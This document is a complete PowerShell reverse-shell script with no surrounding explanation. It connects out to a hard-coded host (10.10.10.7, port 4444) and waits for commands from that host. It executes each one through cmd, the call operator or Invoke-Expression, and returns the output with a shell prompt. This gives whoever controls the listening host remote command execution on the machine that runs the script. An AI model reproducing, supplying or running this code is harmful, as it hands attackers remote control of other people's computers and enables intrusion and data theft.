$host_ip="10.10.10.7";
$host_port=4444;
$client = New-Object System.Net.Sockets.TCPClient($host_ip,$host_port);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    if($data.Trim() -eq "exit"){
        break;
    }
    $cmdecho = "CMD: " + $data.Trim() + "`n";
    $cmdechobyte = ([text.encoding]::ASCII).GetBytes($cmdecho);
    $stream.Write($cmdechobyte,0,$cmdechobyte.Length);
    $stream.Flush();
    if ($data.Trim() -match "^(powershell|cmd|\.\\)" ){        
        $command_array = $data.Trim().Split(" ");
        $command = $command_array[0];
        $arguments = "";
        if ($command_array.Length -eq 1) {
        }
        else {
            $arguments = $command_array[1..($command_array.Length - 1)];
        }                
        echo "Executing command: $command with arguments: $arguments";
        $sendback = & $command $arguments 2>&1 | Out-String;
    }
    elseif($data.Trim() -match "^(net|sc|wmic|reg|tasklist|ipconfig|systeminfo|dir|type|more)"){
        try{
            $sendback = (cmd /c $data.Trim() "2>&1" | Out-String);
        }
        catch{
            $sendback = $_.Exception.Message + "`n";
        }
    }
    else{
        try{
            $sendback = (iex ".{$data} *>&1" | Out-String);
        }
        catch {
            $sendback = $_.Exception.Message+"`n";
        }
    };
    if([string]::IsNullOrEmpty($sendback.Trim())) {
        $sendback = "Command completed - no output`n";
    };
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}